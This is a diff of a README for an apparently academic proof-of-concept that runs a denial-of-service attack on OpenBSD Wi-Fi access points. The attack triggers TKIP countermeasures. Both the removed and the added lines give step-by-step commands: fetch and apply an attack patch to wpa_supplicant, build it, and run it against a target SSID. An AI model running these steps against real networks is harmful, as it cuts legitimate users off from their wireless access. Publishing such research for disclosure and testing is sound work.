@@ -78,16 +78,13 @@ This triggers the permanent TKIP countermeasure period, meaning clients can no l
 
 To execute the attack first patch `wpa_supplicant`:
 
-		git clone git://w1.fi/srv/git/hostap.git -b hostap_2_6 openbsd-dos
-		cd openbsd-dos
-		wget https://raw.githubusercontent.com/vanhoefm/asiaccs2017-pocs/master/openbsd/attack_ap_dos.patch
-		git apply attack_ap_dos.patch
-		cd wpa_supplicant
-		cp defconfig .config
-		make -j 8
+		sudo apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev rfkill
+		./get-and-compile-dos.sh
+		cd openbsd-dos/wpa_supplicant/
 
-Then edit `network.conf` so it contains the target SSID and run:
+Then edit `network.conf` so it contains the target SSID, **disable Wi-Fi in your network manager**, and run:
 
+		sudo rfkill unblock wifi
 		sudo ./wpa_supplicant -D nl80211 -i $INTERFACE -c network.conf
 
 Where `$INTERFACE` is a wireless interface.
